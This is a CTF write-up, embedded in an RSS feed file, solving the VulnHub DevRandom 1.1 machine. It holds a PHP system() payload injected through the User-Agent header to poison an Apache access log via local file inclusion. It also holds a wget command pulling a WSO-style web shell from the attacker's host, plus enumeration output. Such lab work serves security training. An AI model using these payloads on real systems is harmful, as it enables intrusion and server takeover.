@@ -1,0 +1,872 @@
+<?xml version="1.0" encoding="UTF-8" ?>
+<rss version="2.0" xmlns:atom="http://www.w3.org/2005/Atom" xmlns:dc="http://purl.org/dc/elements/1.1/">
+  <channel>
+    <title>(VulnHub) DevRandom CTF: 1.1 | WriteUp</title>
+    <link>https://d.clarkee.co.uk/t/vulnhub-devrandom-ctf-1-1-writeup/20195</link>
+    <description>Hello guys, 
+This is gonna be my writeup for ( DevRandom CTF: 1.1 ) from [VulnHub](https://www.vulnhub.com/entry/devrandom-ctf-11,450/).
+For challengers and CTF players you can try it before reading my solution.
+P.S:both video and text writeup are included.
+
+[details=&quot;Summary&quot;]
+https://www.youtube.com/watch?v=7d2shrQA_bs
+
+`http://192.168.1.148/`
+
+the source :
+
+`&lt;center&gt;&lt;br&gt; This Page is Closed!&lt;br&gt;&lt;img src=&quot;seizure.jpg&quot;&gt;&lt;br&gt;&lt;/center&gt;`
+
+so we have only one image ... let&#39;s download it and before that let&#39;s run nmap and dirbuster
+
+I prefer using wfuzz instead of dirbuster or gobuster or whatever nowdays tools !
+
+and for the image we can use exiftool and mediainfo (for windows)
+
+to get any hidden informations or strings
+
+    &gt; exiftool seizure.jpg
+    ExifTool Version Number         : 10.61
+    File Name                       : seizure.jpg
+    Directory                       : .
+    File Size                       : 181 kB
+    File Modification Date/Time     : 2020:03:30 13:35:14+01:00
+    File Access Date/Time           : 2020:03:30 13:35:14+01:00
+    File Creation Date/Time         : 2020:03:30 13:35:13+01:00
+    File Permissions                : rw-rw-rw-
+    File Type                       : JPEG
+    File Type Extension             : jpg
+    MIME Type                       : image/jpeg
+    JFIF Version                    : 1.01
+    Resolution Unit                 : None
+    X Resolution                    : 1
+    Y Resolution                    : 1
+    Image Width                     : 1294
+    Image Height                    : 736
+    Encoding Process                : Progressive DCT, Huffman coding
+    Bits Per Sample                 : 8
+    Color Components                : 3
+    Y Cb Cr Sub Sampling            : YCbCr4:2:0 (2 2)
+    Image Size                      : 1294x736
+    Megapixels                      : 0.952
+    -- press RETURN --
+
+nothing looks interesting
+
+nothing in strings too !
+
+so let&#39;s go back to our wfuzz run
+
+    &gt; wfuzz -c -u &quot;http://192.168.1.148/FUZZ&quot; -w raft-large-files.txt --hc 404,500,403
+    ********************************************************
+    * Wfuzz 2.4.5 - The Web Fuzzer                         *
+    ********************************************************
+
+    Target: http://192.168.1.148/FUZZ
+    Total requests: 37042
+
+    ===================================================================
+    ID           Response   Lines    Word     Chars       Payload
+    ===================================================================
+
+    000000029:   200        1 L      6 W      74 Ch       &quot;wp-login.php&quot;
+    000000123:   200        98 L     838 W    7368 Ch     &quot;readme.html&quot;
+    000000199:   200        385 L    3179 W   19935 Ch    &quot;license.txt&quot;
+    000000241:   200        6 L      8 W      86 Ch       &quot;robots.txt&quot;
+    000000256:   200        1 L      6 W      74 Ch       &quot;wp-config.php&quot;
+    000000290:   200        1 L      6 W      74 Ch       &quot;wp-trackback.php&quot;
+    000000372:   200        1 L      6 W      74 Ch       &quot;.&quot;
+    000000392:   200        1 L      6 W      74 Ch       &quot;wp-mail.php&quot;
+    000000406:   200        1 L      6 W      74 Ch       &quot;wp-cron.php&quot;
+    000000441:   200        1 L      6 W      74 Ch       &quot;wp-blog-header.php&quot;
+    000000455:   200        1 L      6 W      74 Ch       &quot;wp-links-opml.php&quot;
+    000000001:   200        1 L      6 W      74 Ch       &quot;index.php&quot;
+    000000831:   200        1 L      6 W      74 Ch       &quot;wp-load.php&quot;
+    000001058:   200        1081 L   13015    107376 Ch   &quot;log.php&quot;
+                                     W
+    000001066:   200        1 L      6 W      74 Ch       &quot;wp-signup.php&quot;
+    000001500:   302        0 L      0 W      0 Ch        &quot;wp-activate.php&quot;
+    000025413:   400        8 L      27 W     226 Ch      &quot;directory                e.g.&quot;
+
+    000034083:   200        2 L      1 W      38 Ch       &quot;secret.php&quot;
+
+    Total time: 31.41398
+    Processed Requests: 37042
+    Filtered Requests: 37024
+    Requests/sec.: 1179.156
+
+it&#39;s looks like we have a wordpress CMS but not working correctly ...
+
+Our Wappalyzer addon confirm that we are in a WordPress
+&gt; CMS
+&gt; WordPress
+
+in the source code of the page &quot;http://192.168.1.148/?include=info&quot;
+
+we have a weird IP &quot;192.168.1.214&quot; that why our wordpress looks missed up !
+
+when they installed the wordpress on the VM the IP was 192.168.1.214 and ours 192.168.1.148
+
+anyway let&#39;s continue ...
+
+for many files we have the same number of words &quot;6 W&quot; means let&#39;s ignore these files ...
+
+we have a kind of more words in this file
+
+`000001058:   200        1081 L   13015    107376 Ch   &quot;log.php&quot;`
+
+let&#39;s give it a visit
+
+OOoh we have a kind of access log files !
+
+&gt; view acces.log file : /var/www/html/access.log
+
+an access log is where the apache saves the visitors informations ... let&#39;s detail a value
+
+`192.168.1.33 - - [30/Mar/2020:07:26:27 -0500] &quot;GET / HTTP/1.1&quot; 200 317 &quot;-&quot; &quot;Mozilla/5.0 (Windows NT 6.1; WOW64; rv:56.0) Gecko/20100101 Firefox/56.0&quot;`
+
+we have first the IP address of the visitor !
+
+and then the date
+
+the request method GET
+
+the visited file or folder
+
+the response code and finally the browser user agent
+
+So in Local file Include exploitation we always go back to the access log so we can inject some php codes and then run its
+
+let&#39;s try to inject something and before that let&#39;s see our nmap scan ...
+
+    &gt; nmap -sC -sV 192.168.1.148 --unprivileged
+    Starting Nmap 7.80 ( https://nmap.org ) at 2020-03-30 13:33 W. Central Africa Standard Time
+    Strange read error from 192.168.1.148 (203 - &#39;Unknown error&#39;)
+    Strange read error from 192.168.1.148 (203 - &#39;Unknown error&#39;)
+    Strange read error from 192.168.1.148 (203 - &#39;Unknown error&#39;)
+    Strange read error from 192.168.1.148 (203 - &#39;Unknown error&#39;)
+    Strange read error from 192.168.1.148 (203 - &#39;Unknown error&#39;)
+    Nmap scan report for 192.168.1.148
+    Host is up (1.0s latency).
+    Not shown: 993 closed ports
+    PORT      STATE    SERVICE       VERSION
+    22/tcp    open     ssh           OpenSSH 7.9p1 Debian 10+deb10u2 (protocol 2.0)
+    | ssh-hostkey:
+    |   2048 83:e5:a1:51:b1:f6:98:d3:19:e7:59:10:f7:f4:e8:5e (RSA)
+    |   256 b2:a6:79:c3:ad:2f:ba:cc:02:b3:42:0d:a2:a3:9e:60 (ECDSA)
+    |_  256 ec:1f:d4:29:9f:a5:ae:ca:93:f4:a8:6b:fd:61:44:45 (ED25519)
+    80/tcp    open     http          Apache httpd
+    | http-robots.txt: 3 disallowed entries
+    |_/wp-admin/ /wp-login.php /?include=info
+    |_http-server-header: Apache
+    |_http-title: Site doesn&#39;t have a title (text/html; charset=UTF-8).
+    340/tcp   filtered unknown
+    512/tcp   filtered exec
+    2105/tcp  filtered eklogin
+    5120/tcp  filtered barracuda-bbs
+    18040/tcp filtered unknown
+    Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
+
+    Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
+    Nmap done: 1 IP address (1 host up) scanned in 266.23 seconds
+
+we have to known open ports as we saw in angry ip later and these ports are 22 and 80
+
+    340/tcp   filtered unknown
+    512/tcp   filtered exec
+    2105/tcp  filtered eklogin
+    5120/tcp  filtered barracuda-bbs
+    18040/tcp filtered unknown
+
+and for these ports I swear you guys its the first time I see them but they looks kind of filtered let&#39;s test them via netcat
+
+no responses maybe some false results ...
+
+that doesn&#39;t matter at least we have a webpage and a access log file viewer :p
+
+let&#39;s inject our php code via burpsuite
+
+so the sent request was:
+
+    GET / HTTP/1.1
+    Host: 192.168.1.148
+    User-Agent: x00xTeam !
+    Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
+    Accept-Language: en-US,en;q=0.5
+    Accept-Encoding: gzip, deflate
+    DNT: 1
+    Connection: close
+    Upgrade-Insecure-Requests: 1
+
+the response was **HTTP/1.1 200 OK** which means everything going right ! let&#39;s refresh our log.php file and see
+
+I already refresh it before i wrote the sentence above
+
+`192.168.1.33 - - [30/Mar/2020:07:51:41 -0500] &quot;GET / HTTP/1.1&quot; 200 280 &quot;-&quot; &quot;x00xTeam !&quot;`
+
+so we have our new useragent ... let&#39;s inject some php codes and see if we are able to run it
+
+    GET / HTTP/1.1
+    Host: 192.168.1.148
+    User-Agent: &lt;?php system($_GET[&#39;x&#39;]);?&gt;
+    Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
+    Accept-Language: en-US,en;q=0.5
+    Accept-Encoding: gzip, deflate
+    DNT: 1
+    Connection: close
+    Upgrade-Insecure-Requests: 1
+
+am gonna inject a system function that need a GET request to run so let&#39;s do that
+
+and yes we are able to run PHP codes :D
+
+    # ls -la :
+    total 424
+
+    drwxr-xr-x  6 wordpressftp www-data   4096 Mar 23 14:13 .
+
+    drwxr-x---  4 wordpressftp www-data   4096 Mar 22 08:25 ..
+
+    -rw-r--r--  1 wordpressftp www-data    199 Mar 19 16:17 .htaccess
+
+    -rw-r--r--  1 wordpressftp www-data    420 Nov 30  2017 index.php
+
+    -rw-r--r--  1 wordpressftp www-data  19935 Jan  1  2019 license.txt
+
+    -rw-r--r--  1 wordpressftp www-data    259 Mar 23 14:13 log.php
+
+    -rw-r--r--  1 wordpressftp www-data   7368 Sep  2  2019 readme.html
+
+    -rw-r--r--  1 wordpressftp www-data     86 Mar 18 21:01 robots.txt
+
+    drwxr-xr-x  2 wordpressftp www-data   4096 Mar 22 08:37 secret
+
+    -rw-r--r--  1 wordpressftp www-data    177 Mar 19 16:43 secret.php
+
+    -rw-r--r--  1 wordpressftp www-data 185479 Mar 19 15:53 seizure.jpg
+
+    -rw-r--r--  1 wordpressftp www-data   6939 Sep  2  2019 wp-activate.php
+
+    drwxr-xr-x  9 wordpressftp www-data   4096 Jan 12 05:00 wp-admin
+
+    -rw-r--r--  1 wordpressftp www-data    369 Nov 30  2017 wp-blog-header.php
+
+    -rw-r--r--  1 wordpressftp www-data   2283 Jan 20  2019 wp-comments-post.php
+
+    -rwxrwx---  1 wordpressftp www-data   2898 Jan  7  2019 wp-config-sample.php
+
+    -rw-r--r--  1 wordpressftp www-data   3102 Mar 18 20:02 wp-config.php
+
+    drwxrwx---  7 wordpressftp www-data   4096 Mar 19 15:20 wp-content
+
+    -rw-r--r--  1 wordpressftp www-data   3955 Oct 10 17:52 wp-cron.php
+
+    drwxr-xr-x 20 wordpressftp www-data  12288 Jan 12 05:00 wp-includes
+
+    -rw-r--r--  1 wordpressftp www-data   2504 Sep  2  2019 wp-links-opml.php
+
+    -rw-r--r--  1 wordpressftp www-data   3326 Sep  2  2019 wp-load.php
+
+    -rw-r--r--  1 wordpressftp www-data  47597 Dec  9 07:30 wp-login.php
+
+    -rw-r--r--  1 wordpressftp www-data   8483 Sep  2  2019 wp-mail.php
+
+    -rw-r--r--  1 wordpressftp www-data  19120 Oct 15 10:37 wp-settings.php
+
+    -rw-r--r--  1 wordpressftp www-data  31112 Sep  2  2019 wp-signup.php
+
+    -rw-r--r--  1 wordpressftp www-data   4764 Nov 30  2017 wp-trackback.php
+
+    -rw-r--r--  1 wordpressftp www-data   3150 Jul  1  2019 xmlrpc.php.old
+
+let&#39;s run some commands to know more about our Box
+
+    # id :
+    uid=33(www-data) gid=33(www-data) groups=33(www-data)
+    # pwd :
+    /var/www/html/wordpress/
+
+without taking time in commands let&#39;s upload our php shell so will do that directly
+
+first we need to find writable folders in the current dir
+
+`find /var/www/html/wordpress/ -type d -writable -ls`
+
+here is our writable directories ...
+
+    &quot;   656143      4 drwxrwx---   7 wordpressftp www-data     4096 Mar 19 15:20 /var/www/html/wordpress/wp-content
+       656144      4 drwxrwx---   4 wordpressftp www-data     4096 Mar 19 04:59 /var/www/html/wordpress/wp-content/plugins
+       656435      4 drwxrwx---   4 wordpressftp www-data     4096 Jan 12 05:00 /var/www/html/wordpress/wp-content/languages
+       656445      4 drwxrwx---   2 wordpressftp www-data     4096 Mar 18 20:48 /var/www/html/wordpress/wp-content/languages/plugins
+       656448      4 drwxrwx---   2 wordpressftp www-data     4096 Jan 12 05:00 /var/www/html/wordpress/wp-content/languages/themes
+       656177      4 drwxrwx---   5 wordpressftp www-data     4096 Jan 12 05:00 /var/www/html/wordpress/wp-content/themes
+       656250      4 drwxrwx---   5 wordpressftp www-data     4096 Jan 12 05:00 /var/www/html/wordpress/wp-content/themes/twentyseventeen
+       656297      4 drwxrwx---   5 wordpressftp www-data     4096 Jan 12 05:00 /var/www/html/wordpress/wp-content/themes/twentyseventeen/assets
+       656306      4 drwxrwx---   2 wordpressftp www-data     4096 Jan 12 05:00 /var/www/html/wordpress/wp-content/themes/twentyseventeen/assets/css
+       656313      4 drwxrwx---   2 wordpressftp www-data     4096 Jan 12 05:00 /var/www/html/wordpress/wp-content/themes/twentyseventeen/assets/images
+       656298      4 drwxrwx---   2 wordpressftp www-data     4096 Jan 12 05:00 /var/www/html/wordpress/wp-content/themes/twentyseventeen/assets/js
+       656284      4 drwxrwx---   2 wordpressftp www-data     4096 Jan 12 05:00 /var/www/html/wordpress/wp-content/themes/twentyseventeen/inc
+       656258      4 drwxrwx---   7 wordpressftp www-data     4096 Jan 12 05:00 /var/www/html/wordpress/wp-content/themes/twentyseventeen/template-parts
+       656268      4 drwxrwx---   2 wordpressftp www-data     4096 Jan 12 05:00 /var/www/html/wordpress/wp-content/themes/twentyseventeen/template-parts/post
+       656264      4 drwxrwx---   2 wordpressftp www-data     4096 Jan 12 05:00 /var/www/html/wordpress/wp-content/themes/twentyseventeen/template-parts/page
+       656262      4 drwxrwx---   2 wordpressftp www-data     4096 Jan 12 05:00 /var/www/html/wordpress/wp-content/themes/twentyseventeen/template-parts/navigation
+       656259      4 drwxrwx---   2 wordpressftp www-data     4096 Jan 12 05:00 /var/www/html/wordpress/wp-content/themes/twentyseventeen/template-parts/footer
+       656276      4 drwxrwx---   2 wordpressftp www-data     4096 Jan 12 05:00 /var/www/html/wordpress/wp-content/themes/twentyseventeen/template-parts/header
+       656319      4 drwxrwx---   8 wordpressftp www-data     4096 Jan 12 05:00 /var/www/html/wordpress/wp-content/themes/twentynineteen
+       656362      4 drwxrwx---   2 wordpressftp www-data     4096 Jan 12 05:00 /var/www/html/wordpress/wp-content/themes/twentynineteen/inc
+       656334      4 drwxrwx---   6 wordpressftp www-data     4096 Jan 12 05:00 /var/www/html/wordpress/wp-content/themes/twentynineteen/template-parts
+       656337      4 drwxrwx---   2 wordpressftp www-data     4096 Jan 12 05:00 /var/www/html/wordpress/wp-content/themes/twentynineteen/template-parts/post
+       656340      4 drwxrwx---   2 wordpressftp www-data     4096 Jan 12 05:00 /var/www/html/wordpress/wp-content/themes/twentynineteen/template-parts/content
+       656335      4 drwxrwx---   2 wordpressftp www-data     4096 Jan 12 05:00 /var/www/html/wordpress/wp-content/themes/twentynineteen/template-parts/footer
+       656346      4 drwxrwx---   2 wordpressftp www-data     4096 Jan 12 05:00 /var/www/html/wordpress/wp-content/themes/twentynineteen/template-parts/header
+       656327      4 drwxrwx---   2 wordpressftp www-data     4096 Jan 12 05:00 /var/www/html/wordpress/wp-content/themes/twentynineteen/js
+       656322      4 drwxrwx---   2 wordpressftp www-data     4096 Jan 12 05:00 /var/www/html/wordpress/wp-content/themes/twentynineteen/fonts
+       656377      4 drwxrwx---  13 wordpressftp www-data     4096 Jan 12 05:00 /var/www/html/wordpress/wp-content/themes/twentynineteen/sass
+       656420      4 drwxrwx---   2 wordpressftp www-data     4096 Jan 12 05:00 /var/www/html/wordpress/wp-content/themes/twentynineteen/sass/mixins
+       656423      4 drwxrwx---   2 wordpressftp www-data     4096 Jan 12 05:00 /var/www/html/wordpress/wp-content/themes/twentynineteen/sass/variables-site
+       656416      4 drwxrwx---   2 wordpressftp www-data     4096 Jan 12 05:00 /var/www/html/wordpress/wp-content/themes/twentynineteen/sass/modules
+       656388      4 drwxrwx---   2 wordpressftp www-data     4096 Jan 12 05:00 /var/www/html/wordpress/wp-content/themes/twentynineteen/sass/elements
+       656392      4 drwxrwx---   2 wordpressftp www-data     4096 Jan 12 05:00 /var/www/html/wordpress/wp-content/themes/twentynineteen/sass/navigation
+       656378      4 drwxrwx---   2 wordpressftp www-data     4096 Jan 12 05:00 /var/www/html/wordpress/wp-content/themes/twentynineteen/sass/media
+       656399      4 drwxrwx---   6 wordpressftp www-data     4096 Jan 12 05:00 /var/www/html/wordpress/wp-content/themes/twentynineteen/sass/site
+       656403      4 drwxrwx---   2 wordpressftp www-data     4096 Jan 12 05:00 /var/www/html/wordpress/wp-content/themes/twentynineteen/sass/site/primary
+       656407      4 drwxrwx---   2 wordpressftp www-data     4096 Jan 12 05:00 /var/www/html/wordpress/wp-content/themes/twentynineteen/sass/site/secondary
+       656400      4 drwxrwx---   2 wordpressftp www-data     4096 Jan 12 05:00 /var/www/html/wordpress/wp-content/themes/twentynineteen/sass/site/footer
+       656409      4 drwxrwx---   2 wordpressftp www-data     4096 Jan 12 05:00 /var/www/html/wordpress/wp-content/themes/twentynineteen/sass/site/header
+       656412      4 drwxrwx---   2 wordpressftp www-data     4096 Jan 12 05:00 /var/www/html/wordpress/wp-content/themes/twentynineteen/sass/forms
+       656384      4 drwxrwx---   2 wordpressftp www-data     4096 Jan 12 05:00 /var/www/html/wordpress/wp-content/themes/twentynineteen/sass/typography
+       656431      4 drwxrwx---   2 wordpressftp www-data     4096 Jan 12 05:00 /var/www/html/wordpress/wp-content/themes/twentynineteen/sass/layout
+       656382      4 drwxrwx---   2 wordpressftp www-data     4096 Jan 12 05:00 /var/www/html/wordpress/wp-content/themes/twentynineteen/sass/blocks
+       656356      4 drwxrwx---   2 wordpressftp www-data     4096 Jan 12 05:00 /var/www/html/wordpress/wp-content/themes/twentynineteen/classes
+       656178      4 drwxrwx---   7 wordpressftp www-data     4096 Jan 12 05:00 /var/www/html/wordpress/wp-content/themes/twentytwenty
+       656222      4 drwxrwx---   6 wordpressftp www-data     4096 Jan 12 05:00 /var/www/html/wordpress/wp-content/themes/twentytwenty/assets
+       656235      4 drwxrwx---   2 wordpressftp www-data     4096 Jan 12 05:00 /var/www/html/wordpress/wp-content/themes/twentytwenty/assets/css
+       656240      4 drwxrwx---   2 wordpressftp www-data     4096 Jan 12 05:00 /var/www/html/wordpress/wp-content/themes/twentytwenty/assets/images
+       656227      4 drwxrwx---   2 wordpressftp www-data     4096 Jan 12 05:00 /var/www/html/wordpress/wp-content/themes/twentytwenty/assets/js
+       656223      4 drwxrwx---   3 wordpressftp www-data     4096 Jan 12 05:00 /var/www/html/wordpress/wp-content/themes/twentytwenty/assets/fonts
+       656224      4 drwxrwx---   2 wordpressftp www-data     4096 Jan 12 05:00 /var/www/html/wordpress/wp-content/themes/twentytwenty/assets/fonts/inter
+       656208      4 drwxrwx---   2 wordpressftp www-data     4096 Jan 12 05:00 /var/www/html/wordpress/wp-content/themes/twentytwenty/inc
+       656185      4 drwxrwx---   2 wordpressftp www-data     4096 Jan 12 05:00 /var/www/html/wordpress/wp-content/themes/twentytwenty/template-parts
+       656218      4 drwxrwx---   2 wordpressftp www-data     4096 Jan 12 05:00 /var/www/html/wordpress/wp-content/themes/twentytwenty/templates
+       656198      4 drwxrwx---   2 wordpressftp www-data     4096 Jan 12 05:00 /var/www/html/wordpress/wp-content/themes/twentytwenty/classes
+       655416      4 drwxrwx---   3 www-data     www-data     4096 Mar 18 20:03 /var/www/html/wordpress/wp-content/uploads
+       657692      4 drwxrwx---   3 www-data     www-data     4096 Mar 18 20:03 /var/www/html/wordpress/wp-content/uploads/2020
+       657693      4 drwxrwx---   2 www-data     www-data     4096 Mar 19 07:04 /var/www/html/wordpress/wp-content/uploads/2020/03
+
+let&#39;s upload it inside this folder
+
+`/var/www/html/wordpress/wp-content`
+
+the command:
+
+`cd /var/www/html/wordpress/wp-content/;wget http://192.168.1.33:8080/dz_wso.php;ls -la`
+
+and we are in
+
+`http://192.168.1.148/wp-content/dz_wso.php`
+
+I like using this shell it facilate me many things and I always prefer interfaces and windows ...
+
+so let&#39;s get the max informations we can take from the server we have a long way to the root
+
+`Linux lucifer 4.19.0-8-amd64 #1 SMP Debian 4.19.98-1 (2020-01-26) x86_64` 
+
+
+    $ ps aux
+    USER       PID %CPU %MEM    VSZ   RSS TTY      STAT START   TIME COMMAND
+    root         1  0.0  0.9 103976 10088 ?        Ss   07:25   0:01 /sbin/init
+    root         2  0.0  0.0      0     0 ?        S    07:25   0:00 [kthreadd]
+    root         3  0.0  0.0      0     0 ?        I&lt;   07:25   0:00 [rcu_gp]
+    root         4  0.0  0.0      0     0 ?        I&lt;   07:25   0:00 [rcu_par_gp]
+    root         6  0.0  0.0      0     0 ?        I&lt;   07:25   0:00 [kworker/0:0H-kblockd]
+    root         8  0.0  0.0      0     0 ?        I&lt;   07:25   0:00 [mm_percpu_wq]
+    root         9  0.0  0.0      0     0 ?        S    07:25   0:00 [ksoftirqd/0]
+    root        10  0.0  0.0      0     0 ?        I    07:25   0:00 [rcu_sched]
+    root        11  0.0  0.0      0     0 ?        I    07:25   0:00 [rcu_bh]
+    root        12  0.0  0.0      0     0 ?        S    07:25   0:00 [migration/0]
+    root        14  0.0  0.0      0     0 ?        S    07:25   0:00 [cpuhp/0]
+    root        15  0.0  0.0      0     0 ?        S    07:25   0:00 [kdevtmpfs]
+    root        16  0.0  0.0      0     0 ?        I&lt;   07:25   0:00 [netns]
+    root        17  0.0  0.0      0     0 ?        S    07:25   0:00 [kauditd]
+    root        18  0.0  0.0      0     0 ?        S    07:25   0:00 [khungtaskd]
+    root        19  0.0  0.0      0     0 ?        S    07:25   0:00 [oom_reaper]
+    root        20  0.0  0.0      0     0 ?        I&lt;   07:25   0:00 [writeback]
+    root        21  0.0  0.0      0     0 ?        S    07:25   0:00 [kcompactd0]
+    root        22  0.0  0.0      0     0 ?        SN   07:25   0:00 [ksmd]
+    root        23  0.0  0.0      0     0 ?        SN   07:25   0:00 [khugepaged]
+    root        24  0.0  0.0      0     0 ?        I&lt;   07:25   0:00 [crypto]
+    root        25  0.0  0.0      0     0 ?        I&lt;   07:25   0:00 [kintegrityd]
+    root        26  0.0  0.0      0     0 ?        I&lt;   07:25   0:00 [kblockd]
+    root        27  0.0  0.0      0     0 ?        I&lt;   07:25   0:00 [edac-poller]
+    root        28  0.0  0.0      0     0 ?        I&lt;   07:25   0:00 [devfreq_wq]
+    root        29  0.0  0.0      0     0 ?        S    07:25   0:00 [watchdogd]
+    root        30  0.0  0.0      0     0 ?        S    07:25   0:00 [kswapd0]
+    root        48  0.0  0.0      0     0 ?        I&lt;   07:25   0:00 [kthrotld]
+    root        49  0.0  0.0      0     0 ?        I&lt;   07:25   0:00 [ipv6_addrconf]
+    root        50  0.0  0.0      0     0 ?        I    07:25   0:00 [kworker/u2:1-events_unbound]
+    root        59  0.0  0.0      0     0 ?        I&lt;   07:25   0:00 [kstrp]
+    root        96  0.0  0.0      0     0 ?        I    07:25   0:01 [kworker/0:2-memcg_kmem_cache]
+    root       106  0.0  0.0      0     0 ?        I&lt;   07:25   0:00 [ata_sff]
+    root       108  0.0  0.0      0     0 ?        S    07:25   0:00 [scsi_eh_0]
+    root       109  0.0  0.0      0     0 ?        I&lt;   07:25   0:00 [scsi_tmf_0]
+    root       110  0.0  0.0      0     0 ?        S    07:25   0:00 [scsi_eh_1]
+    root       112  0.0  0.0      0     0 ?        I&lt;   07:25   0:00 [scsi_tmf_1]
+    root       113  0.0  0.0      0     0 ?        S    07:25   0:00 [scsi_eh_2]
+    root       115  0.0  0.0      0     0 ?        I    07:25   0:00 [kworker/u2:2-flush-8:0]
+    root       116  0.0  0.0      0     0 ?        I&lt;   07:25   0:00 [scsi_tmf_2]
+    root       153  0.0  0.0      0     0 ?        I&lt;   07:25   0:00 [kworker/0:1H-kblockd]
+    root       184  0.0  0.0      0     0 ?        I&lt;   07:25   0:00 [kworker/u3:0]
+    root       186  0.0  0.0      0     0 ?        S    07:25   0:00 [jbd2/sda1-8]
+    root       187  0.0  0.0      0     0 ?        I&lt;   07:25   0:00 [ext4-rsv-conver]
+    root       221  0.0  0.7  32188  7752 ?        Ss   07:25   0:00 /lib/systemd/systemd-journald
+    root       249  0.0  0.5  22452  5452 ?        Ss   07:25   0:00 /lib/systemd/systemd-udevd
+    systemd+   283  0.0  0.6  93080  6356 ?        Ssl  07:25   0:00 /lib/systemd/systemd-timesyncd
+    root       323  0.0  0.0      0     0 ?        I&lt;   07:25   0:00 [ttm_swap]
+    root       324  0.0  0.0      0     0 ?        S    07:25   0:00 [irq/18-vmwgfx]
+    message+   367  0.0  0.4   8972  4348 ?        Ss   07:25   0:00 /usr/bin/dbus-daemon --system --address=systemd: --nofork --nopidfile --systemd-activation --syslog-only
+    root       368  0.0  0.7  19400  7092 ?        Ss   07:25   0:00 /lib/systemd/systemd-logind
+    root       369  0.0  0.2   8504  2768 ?        Ss   07:25   0:00 /usr/sbin/cron -f
+    root       370  0.0  0.3 225824  3820 ?        Ssl  07:25   0:00 /usr/sbin/rsyslogd -n -iNONE
+    root       382  0.0  0.5   9488  5692 ?        Ss   07:25   0:00 /sbin/dhclient -4 -v -i -pf /run/dhclient.enp0s3.pid -lf /var/lib/dhcp/dhclient.enp0s3.leases -I -df /var/lib/dhcp/dhclient6.enp0s3.leases enp0s3
+    root       406  0.0  1.9 110360 20204 ?        Ssl  07:25   0:00 /usr/bin/python3 /usr/share/unattended-upgrades/unattended-upgrade-shutdown --wait-for-signal
+    root       408  0.0  0.1   5612  1504 tty1     Ss+  07:25   0:00 /sbin/agetty -o -p -- \u --noclear tty1 linux
+    mysql      490  0.0  9.3 1264720 94088 ?       Ssl  07:25   0:02 /usr/sbin/mysqld
+    root       499  0.0  0.6  15852  7032 ?        Ss   07:25   0:00 /usr/sbin/sshd -D
+    root       539  0.0  2.4 215156 24616 ?        Ss   07:26   0:00 /usr/sbin/apache2 -k start
+    proftpd    670  0.0  0.3  24016  3676 ?        Ss   07:26   0:00 proftpd: (accepting connections)
+    www-data  1109  0.0  3.4 220452 34668 ?        S    07:26   0:00 /usr/sbin/apache2 -k start
+    www-data  1110  0.0  3.5 218424 36148 ?        S    07:26   0:00 /usr/sbin/apache2 -k start
+    www-data  1111  0.0  3.8 218488 38480 ?        S    07:26   0:01 /usr/sbin/apache2 -k start
+    www-data  1112  0.0  3.3 218744 33468 ?        S    07:26   0:00 /usr/sbin/apache2 -k start
+    www-data  1179  0.0  3.4 220516 34476 ?        S    07:26   0:00 /usr/sbin/apache2 -k start
+    www-data  1513  0.0  3.7 218680 37932 ?        S    07:35   0:00 /usr/sbin/apache2 -k start
+    www-data  1514  0.0  3.2 218468 32652 ?        S    07:35   0:00 /usr/sbin/apache2 -k start
+    www-data  1515  0.0  3.7 216372 37924 ?        S    07:35   0:00 /usr/sbin/apache2 -k start
+    www-data  1516  0.0  3.7 218680 37984 ?        S    07:35   0:00 /usr/sbin/apache2 -k start
+    www-data  1519  0.0  3.7 216376 37868 ?        S    07:35   0:00 /usr/sbin/apache2 -k start
+    root      1605  0.0  0.0      0     0 ?        I    07:57   0:00 [kworker/0:1-ata_sff]
+    root      1622  0.0  0.0      0     0 ?        I    08:02   0:00 [kworker/0:0-ata_sff]
+    www-data  1645  0.0  0.0   2388   700 ?        S    08:03   0:00 sh -c ps aux
+    www-data  1646  0.0  0.2   7640  2700 ?        R    08:03   0:00 ps aux
+
+nothing weird or special in process list !
+
+the passwd file:
+
+    root:x:0:0:root:/root:/bin/bash
+    daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
+    bin:x:2:2:bin:/bin:/usr/sbin/nologin
+    sys:x:3:3:sys:/dev:/usr/sbin/nologin
+    sync:x:4:65534:sync:/bin:/bin/sync
+    games:x:5:60:games:/usr/games:/usr/sbin/nologin
+    man:x:6:12:man:/var/cache/man:/usr/sbin/nologin
+    lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin
+    mail:x:8:8:mail:/var/mail:/usr/sbin/nologin
+    news:x:9:9:news:/var/spool/news:/usr/sbin/nologin
+    uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin
+    proxy:x:13:13:proxy:/bin:/usr/sbin/nologin
+    www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
+    backup:x:34:34:backup:/var/backups:/usr/sbin/nologin
+    list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin
+    irc:x:39:39:ircd:/var/run/ircd:/usr/sbin/nologin
+    gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin
+    nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin
+    systemd-timesync:x:100:102:systemd Time Synchronization,,,:/run/systemd:/usr/sbin/nologin
+    systemd-network:x:101:103:systemd Network Management,,,:/run/systemd/netif:/usr/sbin/nologin
+    systemd-resolve:x:102:104:systemd Resolver,,,:/run/systemd/resolve:/usr/sbin/nologin
+    _apt:x:103:65534::/nonexistent:/usr/sbin/nologin
+    messagebus:x:104:110::/nonexistent:/usr/sbin/nologin
+    sshd:x:105:65534::/run/sshd:/usr/sbin/nologin
+    john:x:1000:1000:john,,,:/home/john:/bin/bash
+    systemd-coredump:x:999:999:systemd Core Dumper:/:/usr/sbin/nologin
+    lisa:x:1001:1001:,,,:/home/lisa:/bin/bash
+    henri:x:1002:1002:,,,:/home/henri:/bin/bash
+    mysql:x:106:113:MySQL Server,,,:/nonexistent:/bin/false
+    proftpd:x:107:65534::/run/proftpd:/usr/sbin/nologin
+    ftp:x:108:65534::/srv/ftp:/usr/sbin/nologin
+    wordpressftp:x:1003:1003:,,,:/var/www/html:/bin/rbash
+    victor:x:1004:1004:,,,:/home/victor:/bin/bash
+    trevor:x:1005:1005:,,,:/home/trevor:/bin/bash
+
